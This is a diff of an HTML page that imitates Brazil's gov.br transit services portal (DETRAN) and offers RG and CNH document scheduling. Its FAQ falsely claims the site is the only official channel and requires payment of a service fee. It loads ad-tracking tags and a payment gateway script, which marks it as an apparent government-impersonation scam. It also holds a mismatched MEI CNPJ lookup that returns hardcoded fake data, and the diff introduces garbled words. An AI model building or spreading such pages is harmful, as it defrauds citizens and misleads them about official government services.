@@ -1,4 +1,102 @@
-<header id="site-header">
+
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CYPSP"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-CYPSPHG7VD');
+  </script>
+  
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16981"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-16981780854');
+  </script>
+  
+  <title>Portal de Serviços de Trânsito | Gov.br</title>
+  <meta name="description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato.">
+  <meta name="keywords" content="rg, cnh, segunda via, tirar documento">
+  <meta name="author" content="Gov.br">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#FFFFFF">
+  <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+  <meta name="msapplication-navbutton-color" content="#FFFFFF">
+  
+  <!-- Open Graph -->
+  <meta property="og:title" content="Portal de Serviços de Trânsito | Gov.br">
+  <meta property="og:description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH).">
+  <meta property="og:url" content="#">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="images/brasao.png">
+  
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="images/favicon.png">
+  <link rel="icon" href="images/favicon.png" sizes="32x32">
+  <link rel="icon" href="images/favicon.png" sizes="192x192">
+  <link rel="apple-touch-icon" href="images/favicon.png">
+  <meta name="msapplication-TileImage" content="images/favicon.png">
+  
+  <!-- CSS -->
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+  <!-- Font Awesome CDN - SOLUÇÃO PARA OS ÍCONES -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+  <link rel="stylesheet" href="css/toastify.min.css">
+  <link href="css/style.css" rel="stylesheet">
+  
+  <!-- Scripts -->
+  <script src="js/late.js" data-utmify-prevent-subids="" async defer></script>
+  
+  <!-- Seu JavaScript existente -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        function salvarParametrosNoLocalStorage() {
+            const params = new URLSearchParams(window.location.search);
+            const googleData = {};
+            googleData.utm_source = 'organic';
+            params.forEach((value, key) => {
+                googleData[key] = value;
+            });
+            localStorage.setItem('google', JSON.stringify(googleData));
+            console.log(googleData);
+        }
+        salvarParametrosNoLocalStorage();
+        
+        const google = JSON.parse(localStorage.getItem('google')) || {};
+        const params = Object.entries(google)
+            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
+            .join('&');
+            
+        var novaUrl1 = './pagina1/index.html';
+        var novaUrl2 = './pagina2/index.html';
+        var novaUrl3 = './pagina3/index.html';
+        var novaUrl4 = './pagina4/index.html';
+        var novaUrl5 = './pagina5/index.html';
+        
+        document.getElementById('service1').addEventListener('click', function() {
+            window.location.href = novaUrl1;
+        });
+        document.getElementById('service2').addEventListener('click', function() {
+            window.location.href = novaUrl2;
+        });
+        document.getElementById('service3').addEventListener('click', function() {
+            window.location.href = novaUrl3;
+        });
+        document.getElementById('service4').addEventListener('click', function() {
+            window.location.href = novaUrl4;
+        });
+        document.getElementById('service5').addEventListener('click', function() {
+            window.location.href = novaUrl5;
+        });
+    });
+  </script>
+</head>
+<body><header id="site-header">
     <div class="header-wrapper container">
         <div class="br-header">
             <div class="header-top">
@@ -11,7 +109,7 @@
                         <ul class=" links-governo svelte-19kdt9x">
                             <li class="titulo svelte-19kdt9x">Acesso Rápido</li>
                             <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Órgãos do Governo</a></li>
-                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acesso à Informação</a></li>
+                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acesso à Informaão</a></li>
                             <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Legislação</a></li>
                             <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acessibilidade</a></li>
                         </ul>
@@ -26,31 +124,247 @@
                         </div>
                         <div class="wrapper svelte-ippqk1">
                             <div class="button-badge svelte-ippqk1">
-                                <button class="br-button circle small false svelte-ippqk1" type="button" aria-label="Entrar com gov.br"><i class="fas fa-user" aria-hidden="true"></i><span class="sr-only">Entrar com gov.br</span></button>
+                                <button class="br-button circle small false false cookies svelte-ippqk1" type="button" aria-label="Cookies"><i class="fas fa-cookie-bite svelte-ippqk1" aria-hidden="true"></i></button> 
+                            </div>
+                        </div>
+                        <div class="wrapper svelte-ippqk1">
+                            <div class="button-badge svelte-ippqk1">
+                                <button class="br-button circle small false false contrast-button svelte-ippqk1" type="button" aria-label="Alto contraste"><i class="fas fa-adjust svelte-ippqk1" aria-hidden="true"></i></button>
+                            </div>
+                        </div>
+                        <div class="wrapper svelte-ippqk1">
+                            <div class="button-badge svelte-ippqk1">
+                                <button class="br-button circle small false false slideBarAnonima svelte-ippqk1" type="button" aria-label="Sistemas."><i class="fas fa-th svelte-ippqk1" aria-hidden="true"></i></button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="wrapper-login">
+                        <div class="header-sign-in">
+                            <div class="cta-wrapper svelte-7keokj">
+                                <button class="br-sign-in primary ml-2 false svelte-7keokj d-none d-lg-block d-xl-block" type="button"><i class="fas fa-user" aria-hidden="true"></i> Entrar com gov.br</button>
+                                <button class="br-sign-in primary ml-2 false svelte-7keokj d-block d-lg-none d-xl-none" type="button"><i class="fas fa-user" aria-hidden="true"></i> Entrar</button>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
-            <div class="header-bottom">
-                <div class="header-menu">
-                    <div class="header-menu-trigger">
-                        <button class="br-button small circle" type="button" aria-label="Menu do site" data-toggle="menu" data-target="#main-navigation"><i class="fas fa-bars" aria-hidden="true"></i></button>
-                    </div>
-                    <div class="header-info">
-                        <div class="header-title">Portal de Serviços de Trânsito</div>
-                        <div class="header-subtitle">Ministério da Infraestrutura</div>
-                    </div>
+        </div>
+    </div>
+    <div class="main">
+        <div class="header-wrapper container">
+            <div class="site-name-wrapper">
+                <a class="ico-navegacao toggle-main-navigation" href="javascript:void(0)">
+                    <span class="sr-only">Abrir menu principal de navegação</span>
+                    <span class="fa fa-bars" aria-hidden="true"></span>
+                    <span class="fa fa-times" aria-hidden="true"></span>
+                </a>
+                <div class="site-name">
+                    <a href="javascript:void(0)">Portal de Serviços de Trânsito</a>
                 </div>
-                <div class="header-search">
-                    <div class="br-input has-icon">
-                        <label for="searchbox-71842" class="sr-only">Buscar no portal</label>
-                        <input id="searchbox-71842" type="text" placeholder="Buscar no portal">
-                        <button class="br-button circle small" type="button" aria-label="Buscar"><i class="fas fa-search" aria-hidden="true"></i></button>
+            </div>
+            <div class="govbr-busca-header">
+                <div id="govbr-busca-input">
+                    <div class="aa-Autocomplete" role="combobox" aria-expanded="false" aria-haspopup="listbox" aria-labelledby="searchtext-label">
+                        <form class="aa-Form" action="" novalidate="" role="search"><div class="aa-InputWrapperPrefix"><div class="aa-LoadingIndicator" hidden=""><svg class="aa-LoadingIcon" viewBox="0 0 100 100" width="20" height="20"><circle cx="50" cy="50" fill="none" r="35" stroke="currentColor" stroke-dasharray="164.93361431346415 56.97787143782138" stroke-width="6"><animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;90 50 50;180 50 50;360 50 50" keyTimes="0;0.40;0.65;1"></animateTransform></circle></svg>
+                    </div>
+                    <button class="aa-SubmitButton" type="submit" title="Submit">
+                        <i class="fa-solid fa-magnifying-glass"></i></button>
+                    </div>
+                    <div class="aa-InputWrapper">
+                        <input class="aa-Input" aria-autocomplete="both" aria-labelledby="searchtext-label" id="searchtext-input" autocomplete="off" autocorrect="off" autocapitalize="none" enterkeyhint="search" spellcheck="false" placeholder="O que você procura?" maxlength="512" type="search">
+                    </div>
+                    <div class="aa-InputWrapperSuffix">
+                        <button class="aa-ClearButton" type="reset" title="Clear" hidden=""><svg class="aa-ClearIcon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M5.293 6.707l5.293 5.293-5.293 5.293c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0l5.293-5.293 5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-5.293-5.293 5.293-5.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-5.293 5.293-5.293-5.293c-0.391-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414z"></path></svg></button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <button type="button" class="govbr-busca-toggle" aria-label="Fechar busca"><span class="fas fa-search"></span></button>
+    </div>
+            </div>
+        </div>
+</header>
+
+<div id="loading-form">
+    <div class="image">
+        <img src="images/loading.svg" alt="Carregando">
+    </div>
+</div>
+<div id="portal-breadcrumbs-wrapper">
+    <nav id="breadcrumbs" class="container" aria-label="Histórico de navegação (Breadcrumbs)">
+        <div class="content">
+            <span class="sr-only">Voc está aqui:</span>
+            <span class="home">
+                <a href="javascript:void(0)">
+                    <span class="fas fa-home" aria-hidden="true"></span>
+                    <span class="sr-only">Página Inicial</span>
+                </a>
+            </span>
+            <span dir="ltr" id="breadcrumbs-1">
+                <a href="javascript:void(0)">DETRAN</a>
+            </span>
+        </div>
+    </nav>
+</div>
+<section id="inicio">
+    <div class="container">
+        <div class="consulta-mei">
+            <h2>Consulta de Pendências MEI</h2>
+            <div class="card-consulta">
+                <div class="content-card">
+                    <h3>Digite o CNPJ para consultar as pendências:</h3>
+                    <div class="form-group">
+                        <label for="cnpjInput">CNPJ:</label>
+                        <input type="text" class="form-control" id="cnpjInput" placeholder="Ex: 00.000.000/0001-00">
+                    </div>
+                    <button type="button" class="btn btn-primary mt-3" id="consultarCnpj">Consultar</button>
+                    <div id="resultadoConsulta" class="mt-4" style="display:none;">
+                        <h4>Dados do CNPJ:</h4>
+                        <p><strong>Razão Social:</strong> <span id="razaoSocial"></span></p>
+                        <p><strong>Nome Fantasia:</strong> <span id="nomeFantasia"></span></p>
+                        <p><strong>Situação Cadastral:</strong> <span id="situacaoCadastral"></span></p>
+                        <h4>Pendências Ativas:</h4>
+                        <ul id="listaPendencias"></ul>
                     </div>
                 </div>
             </div>
         </div>
+        <div class="como-solicitar">
+            <h2>Como solicitar o agendamento online?</h2>
+            <div class="cards-como d-flex align-items-stretch justify-content-between flex-wrap">
+                <div class="card-como">
+                    <div class="content-card">
+                        <div class="icone"><i class="fa-solid fa-user-tie"></i></div>
+                        <h3>Preencha o formulário</h3>
+                        <p>Clique no botão inicial para ter acesso ao formulário. Preencha seus dados até o fim para chegar na tela de pagamento.</p>
+                    </div>
+                </div>
+                <div class="card-como">
+                    <div class="content-card">
+                        <div class="icone"><i class="fa-solid fa-money-bill-wave"></i></div>
+                        <h3>Realize o pagamento</h3>
+                        <p>Realize o pagamento do pedido. Após compensado o pagamento, ir receber um e-mail de confirmaão.</p>
+                    </div>
+                </div>
+                <div class="card-como">
+                    <div class="content-card">
+                        <div class="icone"><i class="fa-solid fa-envelope"></i></div>
+                        <h3>Receba tudo por e-mail</h3>
+                        <p>Após o confirmado seu pagamento, iremos entrar em contato por e-mail em até 5 dias úteis.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="duvidas">
+            <h2>Dúvidas frequentes</h2>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse01" role="button" aria-expanded="false" aria-controls="collapse01">Quanto tempo demora para receber a confirmação do protocolo de agendamento por e-mail?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse01">O e-mail com a confirmação do protocolo de seu atendimento chega em até 48 horas após a confirmação de pagamento.</p>
+            </div>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse02" role="button" aria-expanded="false" aria-controls="collapse02">Depois que agendei já posso ir ao posto de atendimento?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse02">Não. Só vá ao posto de atendimento com o protocolo de atendimento que enviaremos ao seu e-mail. Este protocolo é a confirmação de que o dia e horário desejado foi devidamente agendado com o posto.</p>
+            </div>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse03" role="button" aria-expanded="false" aria-controls="collapse03">Alm da taxa de serviço será cobrado mais algum valor?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse03">Para emissão de 1ª via não há outras taxas. Entretando, se for emissão de 2ª via do documento, será cobrado uma taxa de emissão.</p>
+            </div>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse04" role="button" aria-expanded="false" aria-controls="collapse04">Posso desistir após pagar?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse04">Sim! Caso o servio ainda não tenha sido realizado, basta entrar em contato em nossos canais de atendimento que faremos o estorno.</p>
+            </div>
+            <div class="duvida">
+                <h4 class="collapse" data-bs-toggle="collapse" href="#collapse05" role="button" aria-expanded="false" aria-controls="collapse05">Posso realizar o agendamento sem a assessoria do site?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse05">Não. Este  o único canal oficial para realizar o agendamento dos seus documentos. Para sua segurança e garantia do serviço, realize o agendamento somente através deste portal governamental.</p>
+            </div>
+        </div>
     </div>
-</header>
+</section>
 
+
+
+<script>
+    document.getElementById('consultarCnpj').addEventListener('click', function() {
+        const cnpj = document.getElementById('cnpjInput').value.replace(/[^0-9]/g, ''); // Remove non-numeric characters
+
+        if (cnpj.length !== 14) {
+            alert('Por favor, digite um CNPJ válido com 14 dígitos.');
+            return;
+        }
+
+        // Simulação de busca de dados
+        const dadosCnpj = {
+            '00000000000100': {
+                razaoSocial: 'EMPRESA TESTE LTDA',
+                nomeFantasia: 'TESTE MEI',
+                situacaoCadastral: 'Ativa',
+                pendencias: ['DAS em atraso (01/2024)', 'Declaração Anual não entregue (2023)']
+            },
+            '11111111111111': {
+                razaoSocial: 'OUTRA EMPRESA LTDA',
+                nomeFantasia: 'OUTRO MEI',
+                situacaoCadastral: 'Ativa',
+                pendencias: []
+            },
+            '22222222222222': {
+                razaoSocial: 'EMPRESA COM PENDENCIA',
+                nomeFantasia: 'MEI PENDENTE',
+                situacaoCadastral: 'Ativa',
+                pendencias: ['DAS em atraso (02/2024)']
+            }
+        };
+
+        const resultado = dadosCnpj[cnpj];
+        const resultadoConsultaDiv = document.getElementById('resultadoConsulta');
+        const listaPendenciasUl = document.getElementById('listaPendencias');
+
+        if (resultado) {
+            document.getElementById('razaoSocial').textContent = resultado.razaoSocial;
+            document.getElementById('nomeFantasia').textContent = resultado.nomeFantasia;
+            document.getElementById('situacaoCadastral').textContent = resultado.situacaoCadastral;
+
+            listaPendenciasUl.innerHTML = ''; // Clear previous pendencies
+            if (resultado.pendencias.length > 0) {
+                resultado.pendencias.forEach(pendencia => {
+                    const li = document.createElement('li');
+                    li.textContent = pendencia;
+                    listaPendenciasUl.appendChild(li);
+                });
+            } else {
+                const li = document.createElement('li');
+                li.textContent = 'Nenhuma pendência ativa encontrada.';
+                listaPendenciasUl.appendChild(li);
+            }
+            resultadoConsultaDiv.style.display = 'block';
+        } else {
+            alert('CNPJ não encontrado na base de dados simulada. Tente 00.000.000/0001-00, 11.111.111/1111-11 ou 22.222.222/2222-22.');
+            resultadoConsultaDiv.style.display = 'none';
+        }
+    });
+</script>
+
+<footer>
+    <div class="container">
+        <div class="logo-rodape">
+            <img src="images/govbr.png" alt="Gov.br">
+        </div>
+        <span>2025 Portal de Serviços de Trânsito. Todos os direitos reservados</span>
+        <div class="links-rodape">
+            <a href="#">Política de privacidade</a>
+            <a href="#">Termos de uso</a>
+        </div>
+    </div>
+    <div class="copy">
+        <div class="container">
+            <span>Todo o conteúdo deste site está publicado sob a licença <a href="#">Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada.</a></span>
+        </div>
+    </div>
+</footer>
+<script src="js/jquery.min.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+<script src="js/jquery.mask.min.js"></script>
+<script src="js/functions.js"></script>
+<script src="js/gateway.js"></script>
+
+</body></html>
